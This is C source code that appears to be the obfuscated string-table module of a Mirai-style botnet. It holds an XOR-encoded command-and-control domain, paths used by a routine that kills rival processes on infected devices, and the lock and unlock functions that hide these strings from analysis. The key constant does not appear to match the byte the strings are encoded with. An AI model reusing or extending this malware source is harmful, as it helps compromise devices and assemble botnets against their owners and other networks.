#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

uint32_t table_key = 0x6d53d2b2;

struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
	add_entry(TABLE_CNC_DOMAIN, "\x1C\x1D\x1E\x00\x4C\x5A\x4D\x03\x48\x1C\x5E\x41\x41\x42\x00\x5A\x41\x5E\x2E", 19);
    add_entry(TABLE_EXEC_SUCCESS, "\x4A\x41\x40\x4B\x00\x2E", 6);
    
    add_entry(TABLE_KILLER_PROC, "\x01\x5E\x5C\x41\x4D\x01\x2E", 7); // /proc/
    add_entry(TABLE_KILLER_EXE, "\x01\x4B\x56\x4B\x2E", 5); // /exe
    add_entry(TABLE_KILLER_FD, "\x01\x48\x4A\x2E", 4); // /fd
    add_entry(TABLE_KILLER_CMDLINE, "\x01\x4D\x43\x4A\x42\x47\x40\x4B\x2E", 9); // /cmdline

}

void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[table] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[table] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}
